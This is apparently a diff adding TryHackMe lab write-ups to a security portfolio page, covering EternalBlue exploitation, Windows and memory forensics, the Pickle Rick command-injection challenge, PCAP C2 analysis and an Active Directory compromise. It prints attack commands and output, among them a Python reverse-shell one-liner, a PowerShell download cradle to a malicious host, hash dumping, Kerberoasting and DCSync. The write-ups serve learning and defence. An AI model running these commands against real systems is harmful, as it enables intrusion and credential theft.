+    <div class="winfo-box">Certificate Code: 10338271 · Issued 12 June 2026. Served as the on-ramp before going deeper into TryHackMe paths and the CEH roadmap.</div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Credential Status</span><span class="wflag-val">Completed · Certificate available below</span></div></div>
+  </div>
+</template>
+
+<template id="wp-blue">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow easy">// EASY · TRYHACKME · WINDOWS EXPLOITATION</div>
+    <h2 class="wmodal-title">BLUE — EternalBlue Exploit</h2>
+    <p class="wmodal-subtitle">Full compromise of a Windows 7 machine via the infamous MS17-010 SMB vulnerability, exploited with Metasploit and followed by credential dumping.</p>
+    <div class="wmodal-tags">
+      <span class="tag">SMB</span><span class="tag">MS17-010</span><span class="tag">Metasploit</span><span class="tag">Windows</span><span class="tag">EternalBlue</span><span class="tag">Mimikatz</span>
+    </div>
+    <div class="wmodal-divider"></div>
+
+    <span class="wmodal-section-label">▸ 01 · Reconnaissance</span>
+    <h3>Nmap Service &amp; Vulnerability Scan</h3>
+    <p>Starting with a full port scan and script-based vulnerability detection to fingerprint the target and confirm the presence of MS17-010.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>kali@forensics:~</span></div>
+      <pre><span class="cmd">nmap -sV -sC --script vuln -p 445 10.10.x.x</span>
+<span class="out">Starting Nmap 7.94 ...</span>
+<span class="hi">PORT    STATE SERVICE      VERSION</span>
+<span class="hi">445/tcp open  microsoft-ds Windows 7 Professional 7601 SP1</span>
+<span class="warn">|  smb-vuln-ms17-010:</span>
+<span class="hi">|    VULNERABLE:</span>
+<span class="out">|    Remote Code Execution vulnerability in Microsoft SMBv1</span>
+<span class="out">|      CVE:       CVE-2017-0143</span>
+<span class="out">|      Risk factor: HIGH</span>
+<span class="warn">|    Disclosure date: 2017-03-14</span></pre>
+    </div>
+    <div class="winfo-box">MS17-010 (EternalBlue) affects SMBv1 on Windows Vista through Server 2008 R2. The NSA-developed exploit was leaked by Shadow Brokers and subsequently weaponized in WannaCry and NotPetya ransomware campaigns.</div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 02 · Exploitation</span>
+    <h3>Metasploit — ms17_010_eternalblue</h3>
+    <p>Loaded the <code>exploit/windows/smb/ms17_010_eternalblue</code> module, configured the RHOSTS and LHOST, then ran the exploit to land a Meterpreter shell as NT AUTHORITY\SYSTEM — no privilege escalation required.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>msfconsole</span></div>
+      <pre><span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="cmd">set RHOSTS 10.10.x.x</span>
+<span class="cmd">set LHOST 10.10.y.y</span>
+<span class="cmd">set payload windows/x64/shell/reverse_tcp</span>
+<span class="cmd">run</span>
+<span class="out">[*] Started reverse TCP handler on 10.10.y.y:4444</span>
+<span class="out">[*] 10.10.x.x:445 - Connecting to target for exploitation.</span>
+<span class="warn">[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>
+<span class="hi">[+] 10.10.x.x:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=</span>
+<span class="hi">[*] Meterpreter session 1 opened</span>
+<span class="out">meterpreter > getuid</span>
+<span class="hi">Server username: NT AUTHORITY\SYSTEM</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 03 · Post-Exploitation</span>
+    <h3>Credential Harvesting with Hashdump</h3>
+    <p>With SYSTEM-level access, dumped all local account NTLM hashes using Meterpreter's hashdump. Cracked the hashes offline with John the Ripper.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>meterpreter</span></div>
+      <pre><span class="cmd">hashdump</span>
+<span class="hi">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="hi">Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::</span>
+<span class="out">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="cmt"># Crack with John</span>
+<span class="cmd">john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt</span>
+<span class="hi">alqfna22         (Jon)</span></pre>
+    </div>
+    <h3>Flag Retrieval</h3>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag 1 — System Root</span><span class="wflag-val">THM{fun_with_flags}</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag 2 — Jon's Desktop</span><span class="wflag-val">THM{cr4ck1ng_h4sh3s}</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag 3 — Documents</span><span class="wflag-val">THM{admin_documents_can_be_valuable}</span></div></div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 04 · Key Takeaways</span>
+    <ul>
+      <li><strong>SMBv1 should be disabled</strong> on all modern Windows systems — it serves no operational purpose and remains critically dangerous.</li>
+      <li><strong>EternalBlue requires no credentials</strong> — a single unauthenticated packet can lead to full SYSTEM access.</li>
+      <li><strong>Patch management is critical</strong> — MS17-010 patch (KB4012212) was released in March 2017 yet many systems remain unpatched years later.</li>
+    </ul>
+  </div>
+</template>
+
+<template id="wp-invwin">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow medium">// MEDIUM · TRYHACKME · DIGITAL FORENSICS</div>
+    <h2 class="wmodal-title">INVESTIGATING WINDOWS</h2>
+    <p class="wmodal-subtitle">Post-compromise forensic investigation of a Windows machine — reconstructing the attacker's timeline through event logs, registry hives, scheduled tasks, and persistence mechanisms.</p>
+    <div class="wmodal-tags">
+      <span class="tag">Windows</span><span class="tag">Event Logs</span><span class="tag">Registry</span><span class="tag">Forensics</span><span class="tag">Persistence</span><span class="tag">DFIR</span>
+    </div>
+    <div class="wmodal-divider"></div>
+
+    <span class="wmodal-section-label">▸ 01 · Initial Triage</span>
+    <h3>System Information Gathering</h3>
+    <p>First step was baselining the system — OS version, last boot time, local users, and installed software to understand the environment before diving into logs.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>cmd.exe (SYSTEM)</span></div>
+      <pre><span class="cmd">systeminfo | findstr /B /C:"OS" /C:"Last Boot"</span>
+<span class="hi">OS Name:          Microsoft Windows Server 2016</span>
+<span class="hi">Last Boot Time:   3/30/2019, 6:00:29 AM</span>
+<span class="cmd">net user</span>
+<span class="out">Administrator  Guest  Jenny  John</span>
+<span class="warn"># Unexpected users: Jenny — investigate further</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 02 · Event Log Analysis</span>
+    <h3>Security Log — Failed &amp; Successful Logons</h3>
+    <p>Examined Security event logs for Event ID 4625 (failed logon) and 4624 (success). Found a burst of 4625 events from external IP preceding a successful 4624 — classic brute-force pattern.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>PowerShell</span></div>
+      <pre><span class="cmd">Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625} | Select -First 10</span>
+<span class="warn">TimeCreated  : 3/30/2019 4:13:07 AM</span>
+<span class="out">Message      : An account failed to log on.</span>
+<span class="out">Account Name : Administrator</span>
+<span class="err">Source IP    : 10.34.2.3   [84 failed attempts in 6 minutes]</span>
+<span class="hi">EventID 4624 : Successful logon — Administrator — 04:14:22</span></pre>
+    </div>
+
+    <h3>Persistence via Scheduled Task</h3>
+    <p>Discovered a malicious scheduled task named "GameOver" that ran a PowerShell download cradle on every logon to re-establish C2.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>PowerShell</span></div>
+      <pre><span class="cmd">Get-ScheduledTask | Where-Object {$_.TaskName -like "*Game*"}</span>
+<span class="hi">TaskName : GameOver</span>
+<span class="warn">Execute  : powershell.exe -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://bad.actor/payload.ps1')"</span>
+<span class="out">Trigger  : AtLogon — User: SYSTEM</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 03 · Registry Investigation</span>
+    <h3>Persistence &amp; Autorun Keys</h3>
+    <p>Checked standard autorun locations. Found a registry run key pointing to a renamed netcat binary masquerading as a Windows process.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>regedit / PowerShell</span></div>
+      <pre><span class="cmd">Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span>
+<span class="hi">Windows Update Service  : C:\Users\Jenny\AppData\Local\Temp\svch0st.exe -e cmd 10.34.2.3 1337</span>
+<span class="warn"># svch0st.exe is a renamed nc.exe (netcat)</span>
+<span class="cmd">Get-FileHash C:\Users\Jenny\AppData\Local\Temp\svch0st.exe</span>
+<span class="hi">SHA256: b60d7c3e82fef91ca5c3b5fa9a5b0f...</span>
+<span class="out"># VirusTotal: 52/72 detections — Netcat 1.12</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 04 · Findings &amp; Flags</span>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag — Attacker's Initial Access Account</span><span class="wflag-val">Jenny</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag — Date of compromise</span><span class="wflag-val">03/30/2019</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag — Malicious scheduled task name</span><span class="wflag-val">GameOver</span></div></div>
+    <ul>
+      <li><strong>Three persistence mechanisms found:</strong> Registry Run key, Scheduled Task, and a new backdoor local account (Jenny).</li>
+      <li><strong>Attacker dwell time:</strong> approximately 18 hours based on earliest 4625 events to latest 4648 (explicit logon).</li>
+      <li><strong>Remediation:</strong> Removed malicious scheduled task, deleted registry Run key, disabled Jenny account, and reset Administrator credentials.</li>
+    </ul>
+  </div>
+</template>
+
+<template id="wp-memfor">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow hard">// HARD · TRYHACKME · MEMORY FORENSICS</div>
+    <h2 class="wmodal-title">MEMORY FORENSICS — DUMP</h2>
+    <p class="wmodal-subtitle">Deep-dive analysis of a Windows memory dump using Volatility 3. Identified a live malware infection, extracted injected shellcode, recovered encryption keys, and documented a full IOC list.</p>
+    <div class="wmodal-tags">
+      <span class="tag">Volatility 3</span><span class="tag">Memory Analysis</span><span class="tag">Malware</span><span class="tag">DFIR</span><span class="tag">Process Injection</span><span class="tag">Shellcode</span>
+    </div>
+    <div class="wmodal-divider"></div>
+
+    <span class="wmodal-section-label">▸ 01 · Memory Acquisition &amp; Profile</span>
+    <h3>Identifying the OS Profile</h3>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>kali@forensics:~</span></div>
+      <pre><span class="cmd">python3 vol.py -f memdump.raw windows.info</span>
+<span class="hi">Kernel Base : 0xf8000285a000</span>
+<span class="hi">Image Type  : Service Pack 1</span>
+<span class="out">NtSystemRoot: C:\Windows</span>
+<span class="out">NtMajorVersion: 6   NtMinorVersion: 1</span>
+<span class="hi">Detected OS : Windows 7 SP1 x64</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 02 · Process Analysis</span>
+    <h3>Process Tree — Spotting Anomalies</h3>
+    <p>Ran <code>windows.pstree</code> to visualize parent-child relationships. Found a suspicious <code>svchost.exe</code> spawned directly by <code>explorer.exe</code> — legitimate svchost processes are always children of <code>services.exe</code>.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>volatility 3</span></div>
+      <pre><span class="cmd">python3 vol.py -f memdump.raw windows.pstree</span>
+<span class="out">PID   PPID  Name             Wow64  Handles</span>
+<span class="out">4     0     System           False  --</span>
+<span class="out"> 280  4     smss.exe         False  --</span>
+<span class="out">  504 280   csrss.exe        False  --</span>
+<span class="out">  544 280   wininit.exe      False  --</span>
+<span class="out">   616 544  services.exe     False  --</span>
+<span class="out">    716 616 svchost.exe      False  --  ← legitimate</span>
+<span class="warn"> 1748 1232 explorer.exe     False  --</span>
+<span class="err">  2496 1748 svchost.exe      False  --  ← ANOMALY: wrong parent</span></pre>
+    </div>
+    <h3>Malfind — Detecting Injected Code</h3>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>volatility 3</span></div>
+      <pre><span class="cmd">python3 vol.py -f memdump.raw windows.malfind --pid 2496</span>
+<span class="warn">Process: svchost.exe   PID: 2496   Start: 0x00400000</span>
+<span class="hi">Flags: PAGE_EXECUTE_READWRITE   VAD Tag: VadS</span>
+<span class="out">4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00</span>
+<span class="hi">MZ header detected — PE injected into process memory</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 03 · Network &amp; C2 Connections</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>volatility 3</span></div>
+      <pre><span class="cmd">python3 vol.py -f memdump.raw windows.netstat</span>
+<span class="out">Offset    Proto LocalAddr        ForeignAddr        State    PID  Owner</span>
+<span class="hi">0x...     TCPv4 192.168.1.105:49215  185.220.101.47:443  ESTABLISHED  2496  svchost.exe</span>
+<span class="warn"># 185.220.101.47 → Known Tor exit node / C2 infrastructure</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 04 · Encryption Key Recovery</span>
+    <p>Used <code>windows.hashdump</code> to extract NTLM hashes, and targeted memory offsets around the injected PE to recover a hardcoded XOR key used by the implant for payload decryption.</p>
+    <div class="wflag"><span class="wflag-icon">🔑</span><div><span class="wflag-label">XOR Key recovered from injected PE</span><span class="wflag-val">0x4e6f74416e4e5341</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag — Malicious process PID</span><span class="wflag-val">2496</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag — C2 IP Address</span><span class="wflag-val">185.220.101.47</span></div></div>
+    <ul>
+      <li><strong>Process hollowing</strong> confirmed — the injected svchost had no corresponding disk image at its reported path.</li>
+      <li><strong>Technique mapped to MITRE ATT&amp;CK:</strong> T1055.012 (Process Hollowing), T1071.001 (Web Protocols C2).</li>
+    </ul>
+  </div>
+</template>
+
+<template id="wp-pickle">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow medium">// MEDIUM · TRYHACKME · WEB EXPLOITATION</div>
+    <h2 class="wmodal-title">PICKLE RICK — Web Exploitation</h2>
+    <p class="wmodal-subtitle">A Rick &amp; Morty-themed web challenge. Identified command injection in a portal, bypassed keyword blacklisting, achieved RCE, and escalated to root to recover all three ingredient flags.</p>
+    <div class="wmodal-tags">
+      <span class="tag">Web App</span><span class="tag">RCE</span><span class="tag">Command Injection</span><span class="tag">Privesc</span><span class="tag">Linux</span><span class="tag">sudo</span>
+    </div>
+    <div class="wmodal-divider"></div>
+
+    <span class="wmodal-section-label">▸ 01 · Enumeration</span>
+    <h3>Web Recon — Source Code &amp; Directory Busting</h3>
+    <p>Inspected page source and found a username in an HTML comment. Ran Gobuster to find hidden directories.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>kali@forensics:~</span></div>
+      <pre><span class="cmt"># Page source comment:</span>
+<span class="hi">&lt;!-- Note to self, remember username: R1ckRul3s --&gt;</span>
+<span class="cmd">gobuster dir -u http://10.10.x.x -w /usr/share/dirb/wordlists/common.txt</span>
+<span class="hi">/login.php           (Status: 200)</span>
+<span class="hi">/robots.txt          (Status: 200)</span>
+<span class="warn">/portal.php          (Status: 302) → redirects to login</span>
+<span class="cmd">curl http://10.10.x.x/robots.txt</span>
+<span class="hi">Wubbalubbadubdub</span>
+<span class="cmt"># robots.txt contained the password!</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 02 · Command Injection via Portal</span>
+    <h3>Bypassing the Blacklist</h3>
+    <p>The portal ran OS commands but blocked the <code>cat</code> command. Used <code>less</code> as an alternative to read files. Established a reverse shell using Python.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>portal.php — command panel</span></div>
+      <pre><span class="cmt"># 'cat' is blacklisted — use less, head, strings, etc.</span>
+<span class="cmd">less Sup3rS3cretPickl3Ingred.txt</span>
+<span class="hi">mr. meeseek hair</span>
+<span class="cmd">python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.y.y",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 03 · Privilege Escalation</span>
+    <h3>sudo -l → Unrestricted sudo</h3>
+    <p>Checking sudo permissions revealed that <code>www-data</code> could run ANY command as root without a password — instant privilege escalation.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>reverse shell</span></div>
+      <pre><span class="cmd">sudo -l</span>
+<span class="hi">User www-data may run the following commands on ip-10-10-x-x:</span>
+<span class="hi">    (ALL) NOPASSWD: ALL</span>
+<span class="cmd">sudo cat /root/3rd.txt</span>
+<span class="hi">3rd ingredient: fleeb juice</span></pre>
+    </div>
+
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Ingredient 1 — /var/www/html</span><span class="wflag-val">mr. meeseek hair</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Ingredient 2 — /home/rick</span><span class="wflag-val">1 jerry tear</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Ingredient 3 — /root</span><span class="wflag-val">fleeb juice</span></div></div>
+    <div class="winfo-box warn">Lesson: Never expose a command panel on a web application. Blacklist-based input filtering is trivially bypassed — use a whitelist approach or avoid OS command execution entirely.</div>
+  </div>
+</template>
+
+<template id="wp-pcap">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow easy">// EASY · NETWORK FORENSICS · WIRESHARK</div>
+    <h2 class="wmodal-title">NETWORK ANALYSIS — PCAP</h2>
+    <p class="wmodal-subtitle">Analysis of a malicious packet capture to identify C2 beaconing, reconstruct HTTP payload delivery, extract a dropped executable, and compile a full set of network-based IOCs.</p>
+    <div class="wmodal-tags">
+      <span class="tag">Wireshark</span><span class="tag">PCAP</span><span class="tag">C2</span><span class="tag">IOC</span><span class="tag">HTTP</span><span class="tag">tshark</span>
+    </div>
+    <div class="wmodal-divider"></div>
+
+    <span class="wmodal-section-label">▸ 01 · Initial PCAP Triage</span>
+    <h3>Protocol Hierarchy &amp; Conversation Stats</h3>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>tshark</span></div>
+      <pre><span class="cmd">tshark -r capture.pcap -q -z io,phs</span>
+<span class="hi">===================================================================</span>
+<span class="hi">Protocol Hierarchy Statistics</span>
+<span class="out">  eth             frames:4821  bytes:5234019</span>
+<span class="out">    ip            frames:4817  bytes:5233601</span>
+<span class="hi">      tcp         frames:4701  bytes:5218432</span>
+<span class="hi">        http      frames:342   bytes:1284832</span>
+<span class="warn">      dns         frames:116   bytes:15169   ← high volume, possible DNS tunneling</span>
+<span class="cmd">tshark -r capture.pcap -q -z conv,tcp | head -20</span>
+<span class="hi">192.168.1.105  →  185.220.101.47:80   Frames:88  Bytes:1.2MB  ← dominant flow</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 02 · C2 Beacon Identification</span>
+    <h3>Regular Interval HTTP GET Requests</h3>
+    <p>Filtered HTTP traffic to the suspicious external IP. Found GET requests to <code>/gate.php?id=</code> at near-exact 60-second intervals — classic C2 heartbeat pattern consistent with Zeus/Zbot malware family.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>tshark / Wireshark filter</span></div>
+      <pre><span class="cmd">tshark -r capture.pcap -Y "http.host == \"185.220.101.47\"" -T fields -e frame.time -e http.request.uri</span>
+<span class="hi">14:02:01.234  GET /gate.php?id=infected-host-001&amp;os=win7&amp;av=0</span>
+<span class="hi">14:03:01.891  GET /gate.php?id=infected-host-001&amp;os=win7&amp;av=0</span>
+<span class="hi">14:04:01.543  GET /gate.php?id=infected-host-001&amp;os=win7&amp;av=0</span>
+<span class="warn"># Interval: ~60.3 seconds  → beacon jitter ±0.5s</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 03 · Payload Extraction</span>
+    <h3>Exporting HTTP Objects</h3>
+    <p>Used Wireshark's "Export Objects → HTTP" to extract a downloaded file. SHA256 hash matched a known banking trojan on VirusTotal.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>tshark</span></div>
+      <pre><span class="cmd">tshark -r capture.pcap --export-objects http,./exported_objects</span>
+<span class="hi">Exported: update.exe  (248,832 bytes)</span>
+<span class="cmd">sha256sum exported_objects/update.exe</span>
+<span class="hi">a3b4c1d9e5f2a0b7c8d4e1f3a5b2c9d6...  update.exe</span>
+<span class="warn"># VirusTotal: 49/72 — Trojan.Zeus.BankBot</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 04 · IOC Summary</span>
+    <div class="wflag"><span class="wflag-icon">🎯</span><div><span class="wflag-label">C2 IP Address</span><span class="wflag-val">185.220.101.47</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🎯</span><div><span class="wflag-label">C2 Beacon URI</span><span class="wflag-val">/gate.php?id=&lt;hostname&gt;&amp;os=&lt;os&gt;&amp;av=&lt;av&gt;</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🎯</span><div><span class="wflag-label">Malware SHA256</span><span class="wflag-val">a3b4c1d9e5f2a0b7c8d4e1f3a5b2c9d6...</span></div></div>
+    <ul>
+      <li><strong>DNS anomaly:</strong> 116 DNS queries to a DGA-generated domain — indicative of DNS-based C2 fallback channel.</li>
+      <li><strong>Data exfil:</strong> 1.2 MB sent to C2 over 40 minutes, likely containing keylog data and screenshots.</li>
+      <li><strong>Detection rule:</strong> Block all outbound connections to 185.220.101.47/24 (Tor exit node range) at the perimeter firewall.</li>
+    </ul>
+  </div>
+</template>
+
+<template id="wp-adpen">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow hard">// HARD · TRYHACKME · ACTIVE DIRECTORY</div>
+    <h2 class="wmodal-title">AD ENUMERATION — ACTIVE DIRECTORY</h2>
+    <p class="wmodal-subtitle">Complete Active Directory penetration test from initial foothold to full domain compromise — BloodHound enumeration, Kerberoasting, Pass-the-Hash, and DCSync for NTDS.dit extraction.</p>
+    <div class="wmodal-tags">
+      <span class="tag">BloodHound</span><span class="tag">Kerberoasting</span><span class="tag">AD</span><span class="tag">DCSync</span><span class="tag">Pass-the-Hash</span><span class="tag">impacket</span>
+    </div>
+    <div class="wmodal-divider"></div>
+
+    <span class="wmodal-section-label">▸ 01 · Initial Foothold &amp; Enumeration</span>
+    <h3>SMB Null Session &amp; LDAP Enumeration</h3>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>kali@forensics:~</span></div>
+      <pre><span class="cmd">enum4linux -a 10.10.x.x</span>
+<span class="hi">Domain: THM-AD   DC: THMDC.THM-AD.LOCAL</span>
+<span class="hi">Users: Administrator, Guest, krbtgt, svc-admin, backup, admin2</span>
+<span class="warn"># svc-admin is a service account — high Kerberoast target</span>
+<span class="cmd">crackmapexec smb 10.10.x.x -u '' -p '' --shares</span>
+<span class="hi">SMB   10.10.x.x  SYSVOL   READ ONLY</span>
+<span class="hi">SMB   10.10.x.x  NETLOGON READ ONLY</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 02 · BloodHound Data Collection</span>
+    <h3>SharpHound → Attack Path Mapping</h3>
+    <p>With a low-privileged user obtained via password spray, ran SharpHound to collect AD relationship data and ingested into BloodHound for attack path analysis.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>Windows — SharpHound</span></div>
+      <pre><span class="cmd">.\SharpHound.exe -c All --zipfilename bloodhound_data.zip</span>
+<span class="hi">Completed: Users (42), Groups (18), Computers (8), Sessions (12)</span>
+<span class="cmt"># Ingest ZIP into BloodHound → query: Shortest path to DA</span>
+<span class="hi">Path found: pwned_user → GenericWrite → svc-admin → Kerberoastable → DA Group</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 03 · Kerberoasting</span>
+    <h3>Requesting &amp; Cracking Service Tickets</h3>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>impacket</span></div>
+      <pre><span class="cmd">GetUserSPNs.py THM-AD/svc-admin:password123 -dc-ip 10.10.x.x -request</span>
+<span class="hi">ServicePrincipalName         Name       MemberOf</span>
+<span class="hi">HTTP/thmserver.THM-AD.local  svc-admin  Domain Admins</span>
+<span class="warn">$krb5tgs$23$*svc-admin$THM-AD.LOCAL$HTTP/thmserver*$a3f9b21...</span>
+<span class="cmd">hashcat -m 13100 svc-admin.hash /usr/share/wordlists/rockyou.txt</span>
+<span class="hi">$krb5tgs$23$...:management2005</span></pre>
+    </div>
+
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ 04 · DCSync — Domain Compromise</span>
+    <h3>Dumping All Domain Hashes</h3>
+    <p>With DA credentials, performed a DCSync attack to replicate all domain credentials from the DC — including the krbtgt hash for a potential Golden Ticket.</p>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>impacket — secretsdump</span></div>
+      <pre><span class="cmd">secretsdump.py THM-AD/svc-admin:management2005@10.10.x.x</span>
+<span class="hi">Administrator:500:aad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::</span>
+<span class="hi">krbtgt:502:aad3b435b51404ee:8fbf5eec4d06f15ee76a456a4e197b13:::</span>
+<span class="warn"># krbtgt hash enables Golden Ticket attacks for persistent access</span></pre>
+    </div>
+
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag — svc-admin password</span><span class="wflag-val">management2005</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag — backup account hash (NTLM)</span><span class="wflag-val">0e0363213e37b94221497260b0bcb4fc</span></div></div>
+    <div class="wflag"><span class="wflag-icon">🚩</span><div><span class="wflag-label">Flag — Full Domain Compromise</span><span class="wflag-val">ACHIEVED — All domain hashes extracted</span></div></div>
+    <ul>
+      <li><strong>Root cause:</strong> Service accounts with weak passwords + excessive group membership (DA) is the most common AD misconfiguration.</li>
+      <li><strong>Mitigations:</strong> Implement managed service accounts (gMSA), enforce 25-char random service account passwords, enable ATA/Defender for Identity to detect Kerberoasting and DCSync.</li>
+      <li><strong>MITRE ATT&amp;CK:</strong> T1558.003 (Kerberoasting), T1003.006 (DCSync), T1550.002 (Pass-the-Hash).</li>
+    </ul>
+  </div>
+</template>
+
+
+
+
+<script src="js/content.js" defer></script>
+<script src="js/main.js" defer></script>
+<script src="js/github.js" defer></script>
+</body>
+</html>
